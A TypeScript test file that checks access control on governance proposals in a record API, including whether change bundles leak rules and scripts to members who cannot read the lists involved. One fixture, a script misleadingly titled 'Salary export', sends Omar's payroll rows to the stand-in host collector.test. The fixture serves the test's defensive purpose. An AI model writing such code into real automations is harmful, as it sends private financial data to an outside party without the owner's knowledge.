/**
 * A `change` is held back from a caller who cannot read a list its declarations touch, as `automations` and `scripts`
 * hold back the rule and the script themselves (`loop/research-batch-thirty-eight-audit.md` finding 3).
 *
 * WHAT WAS MEASURED. `holds` read the list a change is about from `declaration_id` alone, and a change filed under a
 * rule's or a script's id named no list, so it went to every whole-record reader. A member at `write` held to `append`
 * on Money is one: `automations` and `scripts` both refused her Money's automation and the script that reads Money,
 * and `governance` handed her the proposal carrying both, from which Decide drew "Only when: payee is Omar and amount
 * more than 90000" and the source that posts Money's rows to `collector.test`. The same bundle filed under
 * `register.inbox` was refused at filing, so the proposal reached her only through the rule's name.
 */

import { test } from 'node:test';
import assert from 'node:assert/strict';

import { createRecordApi, type CallContext } from '../src/index.ts';
import { fixedClock, openSqlite } from '../../kernel/test/sqlite.ts';

const NOW = Date.UTC(2026, 8, 23, 12);
const owner: CallContext = { principal: { kind: 'person', id: 'p_owner', level: 'owner' } };
/** The audit's member: a whole-record reader at `write`, held to `append` on Money, refused `list money`. */
const member: CallContext = { principal: { kind: 'person', id: 'p_m', level: 'write' }, levels: { money: 'append' } };
/** Invited to Money and Inbox alone, and reads both: every list the bundle touches, and not the record as a whole. */
const both: CallContext = { principal: { kind: 'person', id: 'p_b', level: null }, registers: ['money', 'inbox'], levels: { money: 'read', inbox: 'read' } };
/** Invited to Inbox alone. */
const inboxOnly: CallContext = { principal: { kind: 'person', id: 'p_i', level: null }, registers: ['inbox'], levels: { inbox: 'read' } };

const reg = (id: string, name: string, fields: Record<string, unknown>[]) => ({
  id: `register.${id}`,
  kind: 'register' as const,
  body: { id, name, title: 'what', fields: [{ id: 'what', type: 'text', required: true }, ...fields] } as never,
});
const MONEY = reg('money', 'Money', [{ id: 'amount', type: 'int' }, { id: 'payee', type: 'text' }]);
const INBOX = reg('inbox', 'Inbox', []);
const INBOX2 = reg('inbox', 'Inbox', [{ id: 'from', type: 'text' }]);
const WATCH = {
  id: 'rule.omar-pay',
  kind: 'rule' as const,
  body: {
    rule: 'omar-pay',
    name: 'Omar pay',
    on: { written: { register: 'money', op: ['create'] } },
    when: 'payee is Omar and amount more than 90000',
    once_per: ['entry'],
    steps: [{ notify: { say: 'Omar was paid {{trigger.row.amount}}' } }],
  },
};
const PEEK = {
  id: 'script.peek',
  kind: 'script' as const,
  body: {
    script: 'peek',
    title: 'Salary export',
    runs: { every: '1d' },
    egress: ['https://collector.test'],
    keys: [],
    reads: ['money'],
    writes: [],
    source:
      "export default async function run(ctx) { const rows = await ctx.record.list('money', { field: 'payee', is: 'Omar' }); await ctx.fetch('https://collector.test/x', { method: 'POST', body: JSON.stringify(rows) }); }",
  },
};

type Out = { ok: boolean; value?: unknown; refusal?: { code: string; fix: string } };

async function record() {
  const sql = openSqlite();
  const clock = fixedClock(NOW);
  const api = await createRecordApi({ sql, clock });
  assert.ok(api.kernel.createRecord({ id: 'rec_01JZ8QK3F7R2M9V4XN6TCB5HAD', slug: 'the-studio', name: 'The Studio', tz: 'UTC', locale: 'en', owner: { id: 'p_owner' } }).ok);
  assert.ok((await api.kernel.install([MONEY, INBOX])).ok);
  /* Whether `governance` hands this caller the open proposal asking `question`. */
  const shown = async (ctx: CallContext, question: string): Promise<boolean> => {
    const g = (await api.governance({ status: 'open' }, ctx)) as Out;
    assert.ok(g.ok, JSON.stringify(g));
    return (g.value as { question?: string }[]).some((s) => s.question === question);
  };
  const file = async (question: string, declaration_id: string, to: unknown) => {
    const filed = (await api.propose({ question, body_kind: 'change', body: { declaration_id, to } } as never, owner)) as Out;
    assert.ok(filed.ok, JSON.stringify(filed));
    return filed.value as { id: string };
  };
  return { sql, api, clock, shown, file };
}

test("A CHANGE FILED UNDER A RULE'S NAME IS HELD TO THE LISTS ITS RULE AND SCRIPT TOUCH, and the owner still reads it", async () => {
  const { sql, api, shown, file } = await record();
  const filed = await file('Tidy the inbox?', 'rule.omar-pay', { declarations: [INBOX2, WATCH, PEEK] });

  assert.equal(await shown(owner, 'Tidy the inbox?'), true);
  assert.equal(await shown(member, 'Tidy the inbox?'), false, "a member refused Money's automations was handed a proposal drawing one");
  assert.equal(await shown(inboxOnly, 'Tidy the inbox?'), false);
  /* Somebody who reads every list it touches is shown it, as a change to one of those lists is shown to its readers. */
  assert.equal(await shown(both, 'Tidy the inbox?'), true);

  /* A question she may not read is one she may not decide, and she is told what a missing one is told. At `decide`, so
     the refusal is about the question and not about her level. */
  const decider: CallContext = { ...member, principal: { kind: 'person', id: 'p_m', level: 'decide' } };
  assert.equal(await shown(decider, 'Tidy the inbox?'), false);
  const d = (await api.decide({ id: filed.id, resolved_as: 'wont-fix', reason: 'No.' } as never, decider)) as Out;
  assert.equal(d.ok, false, JSON.stringify(d));
  assert.equal(d.refusal?.fix, `There is no suggestion called ${filed.id}.`);
  sql.close();
});

test("EACH DECLARATION IS READ AS ITS OWN LIST IS: a rule's row and the lists its steps reach, a script's reads and writes", async () => {
  const { sql, shown, file } = await record();
  /* A rule on Inbox that files a row in Money: its row list is hers, the list it writes into is not. */
  const into = {
    id: 'rule.file-it',
    kind: 'rule' as const,
    body: { rule: 'file-it', register: 'inbox', once_per: ['entry'], then: [{ create: { register: 'money', bound: 1, fields: { what: 'from the inbox' } } }] },
  };
  await file('File the inbox into Money?', 'rule.file-it', into);
  /* A script that reads nothing and writes into Money. */
  const writes = { id: 'script.post', kind: 'script' as const, body: { ...PEEK.body, script: 'post', reads: [], writes: ['money'] } };
  await file('Post into Money?', 'script.post', writes);
  /* A rule that stays on Inbox. */
  const stays = { id: 'rule.seen', kind: 'rule' as const, body: { rule: 'seen', register: 'inbox', then: [{ tag: 'seen' }] } };
  await file('Tag the inbox?', 'rule.seen', stays);

  for (const q of ['File the inbox into Money?', 'Post into Money?']) {
    assert.equal(await shown(member, q), false, q);
    assert.equal(await shown(inboxOnly, q), false, q);
    assert.equal(await shown(owner, q), true, q);
  }
  assert.equal(await shown(member, 'Tag the inbox?'), true);
  assert.equal(await shown(inboxOnly, 'Tag the inbox?'), true);
  sql.close();
});

test('A RULE WITH NO ROW AND A SCRIPT THAT TOUCHES NO LIST GO WHERE automations AND scripts SEND THEM: to a caller who reads every list', async () => {
  const { sql, shown, file } = await record();
  const clock = { id: 'rule.nightly', kind: 'rule' as const, body: { rule: 'nightly', on: { every: '1d' }, steps: [{ notify: { say: 'Night.' } }] } };
  await file('Say good night?', 'rule.nightly', clock);
  const ping = { id: 'script.ping', kind: 'script' as const, body: { ...PEEK.body, script: 'ping', reads: [], writes: [] } };
  await file('Ping the collector?', 'script.ping', ping);
  const whole: CallContext = { principal: { kind: 'person', id: 'p_w', level: 'write' } };
  for (const q of ['Say good night?', 'Ping the collector?']) {
    assert.equal(await shown(owner, q), true, q);
    assert.equal(await shown(whole, q), true, `${q}: a whole-record reader who reads every list`);
    assert.equal(await shown(member, q), false, `${q}: a member held to append on Money`);
    assert.equal(await shown(inboxOnly, q), false, `${q}: a member invited to one list`);
  }
  sql.close();
});

test('A CHANGE TO A LIVE RULE IS HELD TO THE LISTS OF THE ONE IT REPLACES AS WELL', async () => {
  const { sql, api, shown, file } = await record();
  assert.ok((await api.kernel.install([WATCH])).ok);
  /* Moved off Money onto Inbox: accepting it changes what Money's rows set off, which is not hers to read. */
  const moved = { ...WATCH, body: { ...WATCH.body, on: { written: { register: 'inbox', op: ['create'] } }, when: undefined } };
  await file('Move Omar pay to the inbox?', 'rule.omar-pay', moved);
  assert.equal(await shown(owner, 'Move Omar pay to the inbox?'), true);
  assert.equal(await shown(member, 'Move Omar pay to the inbox?'), false);
  assert.equal(await shown(inboxOnly, 'Move Omar pay to the inbox?'), false);
  sql.close();
});

/* A PAGE BESIDE THE RULE IS STILL ABOUT THE WHOLE RECORD. `changeTouches` reads lists off rules, scripts and registers
   and marks anything else `whole`; with that line removed every other case here stayed green, and a bundle under a rule
   on Inbox that also carries a page went to a member invited to Inbox alone. Before `changeTouches` the whole bundle
   went only to whole-record readers, and a page is still that. */
test('A BUNDLE UNDER A RULE THAT ALSO CARRIES A PAGE STILL NEEDS A WHOLE-RECORD READER', async () => {
  const { sql, shown, file } = await record();
  const stays = { id: 'rule.seen', kind: 'rule' as const, body: { rule: 'seen', register: 'inbox', then: [{ tag: 'seen' }] } };
  const page = {
    id: 'page.inbox',
    kind: 'page' as const,
    body: { page: 'inbox', title: 'Inbox', requires: ['register.inbox'], blocks: [{ kind: 'table', source: 'register.inbox', span: 12, empty: 'Nothing in.' }] },
  };
  await file('Tag the inbox and give it a page?', 'rule.seen', { declarations: [stays, page] });
  assert.equal(await shown(owner, 'Tag the inbox and give it a page?'), true);
  assert.equal(await shown(inboxOnly, 'Tag the inbox and give it a page?'), false, 'a member invited to Inbox alone was handed a page');
  sql.close();
});

/* ── audit forty (`loop/research-batch-forty-audit.md`) ───────────────────────────────────────────────────────────── */

/** `ingest.payroll`, a door whose arrivals are written into Money. */
const PAYROLL = {
  id: 'ingest.payroll',
  kind: 'ingest' as const,
  body: {
    ingest: 'payroll',
    channel: 'email',
    match: { all: [{ field: 'from', is: 'payroll@bureau.test' }] },
    extract: { what: { after: 'Pay ' } },
    writes: { register: 'money', confidence: 'exact' },
  } as never,
};

/* FINDING 1: UNDER A LIST'S NAME, `holds` ASKED NOTHING BUT THE NAME. A change filed under `register.inbox` was read as
   about Inbox alone and `changeTouches` was never asked, so the filing check was the only gate, and that check does not
   read a script's `reads` and `writes` or an arrival rule's door. Measured before the fix: all three bundles were filed,
   and the member invited to Inbox alone was shown each one whole, the source that posts Omar's Money rows to
   `collector.test` included, while `scripts` answered her `[]`. */
test("A BUNDLE UNDER A LIST'S NAME IS HELD TO EVERY LIST ITS SCRIPTS AND RULES TOUCH, not only to the name", async () => {
  const { sql, api, shown, file } = await record();
  assert.ok((await api.kernel.install([PAYROLL])).ok);
  const writes = { id: 'script.post', kind: 'script' as const, body: { ...PEEK.body, script: 'post', reads: [], writes: ['money'] } };
  const arrived = {
    id: 'rule.arrived',
    kind: 'rule' as const,
    body: { rule: 'arrived', on: { arrival: { ingest: 'payroll' } }, steps: [{ notify: { say: 'The payroll came in.' } }] },
  };
  const asked = ['Give the inbox a sender, and read Money?', 'Give the inbox a sender, and write Money?', 'Give the inbox a sender, and watch the payroll?'];
  await file(asked[0]!, 'register.inbox', { declarations: [INBOX2, PEEK] });
  await file(asked[1]!, 'register.inbox', { declarations: [INBOX2, writes] });
  await file(asked[2]!, 'register.inbox', { declarations: [INBOX2, arrived] });
  for (const q of asked) {
    assert.equal(await shown(owner, q), true, q);
    assert.equal(await shown(inboxOnly, q), false, `${q}: a member invited to Inbox alone was handed it`);
    assert.equal(await shown(both, q), true, `${q}: a member who reads Money and Inbox`);
  }
  /* A change under the list's name that touches nothing else still goes to that list's readers. */
  await file('Give the inbox a sender?', 'register.inbox', INBOX2);
  assert.equal(await shown(inboxOnly, 'Give the inbox a sender?'), true);
  sql.close();
});

/* FINDING 4: A PAGE, A DOOR AND A FIGURE WERE `whole`, AND `whole` IS NOT A LIST. A member held to `append` on Money
   reads the whole record, so `whole` let her through. Measured before the fix: she was shown all four, while `page`
   answered her `PAGE_UNKNOWN` for the page and `metric` answered `METRIC_UNKNOWN` for the figure. */
test('A CHANGE TO A PAGE, A DOOR OR A FIGURE IS HELD TO THE LISTS IT READS AND WRITES', async () => {
  const { sql, shown, file } = await record();
  const page = {
    id: 'page.pay',
    kind: 'page' as const,
    body: { page: 'pay', title: 'Pay', blocks: [{ kind: 'table', source: 'register.money', where: 'payee is Omar', span: 12, empty: 'Nothing paid.' }] },
  };
  const metric = {
    id: 'metric.omar',
    kind: 'metric' as const,
    body: { metric: 'omar', name: 'Omar paid', source: 'register.money', where: { field: 'payee', is: 'Omar' }, value: { count: 'what' }, format: 'int', target: { lte: 99 }, window: '30d' },
  };
  const stays = { id: 'rule.seen', kind: 'rule' as const, body: { rule: 'seen', register: 'inbox', then: [{ tag: 'seen' }] } };
  const asked = ['A page of Omar pay?', 'A payroll door?', 'Tag the inbox and count Omar?', 'Count Omar?'];
  await file(asked[0]!, 'page.pay', page);
  await file(asked[1]!, 'ingest.payroll', PAYROLL);
  await file(asked[2]!, 'rule.seen', { declarations: [stays, metric] });
  await file(asked[3]!, 'metric.omar', metric);
  for (const q of asked) {
    assert.equal(await shown(owner, q), true, q);
    assert.equal(await shown(member, q), false, `${q}: a member held to append on Money was handed it`);
    assert.equal(await shown(inboxOnly, q), false, q);
  }
  /* A page over Inbox alone is still about the record as a whole, as the case above keeps it, and still goes to a
     whole-record reader who reads Inbox. */
  const inboxPage = { id: 'page.in', kind: 'page' as const, body: { page: 'in', title: 'In', blocks: [{ kind: 'table', source: 'register.inbox', span: 12, empty: 'Nothing in.' }] } };
  await file('A page of the inbox?', 'page.in', inboxPage);
  assert.equal(await shown(member, 'A page of the inbox?'), true);
  sql.close();
});

/* FINDING 5: THE LIVE COPY IS TODAY'S, AND AFTER THE ACCEPT TODAY'S IS THE NEW BODY. Measured before the fix: the
   proposal that moved `rule.omar-pay` off Money was held from the member invited to Inbox alone while it was open, and
   the moment the owner accepted it she read the question in `governance`, the decision and its reason, and both again
   in `whatsNew`. */
test('A CHANGE TO A LIVE RULE IS HELD TO THE ONE IT REPLACED AFTER IT IS ACCEPTED, and so is its decision', async () => {
  const { sql, api, clock, shown, file } = await record();
  assert.ok((await api.kernel.install([WATCH])).ok);
  clock.advance(60_000);
  const moved = { ...WATCH, body: { ...WATCH.body, on: { written: { register: 'inbox', op: ['create'] } }, when: undefined } };
  const filed = await file('Move Omar pay to the inbox?', 'rule.omar-pay', moved);
  assert.equal(await shown(inboxOnly, 'Move Omar pay to the inbox?'), false, 'the precondition: held while it is open');
  clock.advance(60_000);
  const d = (await api.decide({ id: filed.id, decide: { option: 'accept', reason: 'Omar is off Money now' } }, owner)) as Out;
  assert.ok(d.ok, JSON.stringify(d));
  assert.equal(sql.one<{ n: number }>("SELECT count(*) AS n FROM declaration WHERE id = 'rule.omar-pay'")?.n, 2, 'the precondition: the move was installed');

  const all = async (ctx: CallContext, register: string) => {
    const g = (await api.governance({ register, status: 'all' }, ctx)) as Out;
    assert.ok(g.ok, JSON.stringify(g));
    return JSON.stringify(g.value);
  };
  assert.equal((await all(owner, 'suggestion')).includes('Move Omar pay to the inbox?'), true);
  assert.equal((await all(owner, 'decision')).includes('Omar is off Money now'), true);
  assert.equal((await all(inboxOnly, 'suggestion')).includes('Move Omar pay to the inbox?'), false, 'the accepted move reached her');
  assert.equal((await all(inboxOnly, 'decision')).includes('Omar is off Money now'), false, "the owner's reason reached her");
  const news = JSON.stringify(await api.whatsNew({}, inboxOnly));
  assert.equal(news.includes('Move Omar pay') || news.includes('Omar is off Money now'), false, `whatsNew named the move: ${news}`);
  sql.close();
});

/* AND IN THE SAME MILLISECOND. A version is placed in time by `created_at` alone, and the one the accept installs is
   created at the decision's instant, so when the change is filed and accepted inside one millisecond (a fixed clock,
   or a Worker whose clock stands still inside a request) the newest version created by `opened` was the new body.
   Measured before this: with no time between the filing and the accept, the member invited to Inbox alone read the
   question and the owner's reason, as she did before finding 5 was fixed. The rule installed in the same millisecond
   as the filing is the other side of the same tie, and it has to be read too. */
test('THE ONE IT REPLACED IS READ WHEN THE CHANGE IS FILED AND ACCEPTED IN THE SAME MILLISECOND, or installed in it', async () => {
  for (const tie of ['filed and accepted', 'installed and filed'] as const) {
    const { sql, api, clock, file } = await record();
    assert.ok((await api.kernel.install([WATCH])).ok);
    if (tie === 'filed and accepted') clock.advance(60_000);
    const moved = { ...WATCH, body: { ...WATCH.body, on: { written: { register: 'inbox', op: ['create'] } }, when: undefined } };
    const filed = await file('Move Omar pay to the inbox?', 'rule.omar-pay', moved);
    if (tie === 'installed and filed') clock.advance(60_000);
    const d = (await api.decide({ id: filed.id, decide: { option: 'accept', reason: 'Omar is off Money now' } }, owner)) as Out;
    assert.ok(d.ok, JSON.stringify(d));
    const all = async (ctx: CallContext, register: string) => JSON.stringify(((await api.governance({ register, status: 'all' }, ctx)) as Out).value);
    assert.equal((await all(owner, 'decision')).includes('Omar is off Money now'), true, `${tie}: the precondition`);
    assert.equal((await all(inboxOnly, 'suggestion')).includes('Move Omar pay to the inbox?'), false, `${tie}: the accepted move reached her`);
    assert.equal((await all(inboxOnly, 'decision')).includes('Omar is off Money now'), false, `${tie}: the owner's reason reached her`);
    sql.close();
  }
});
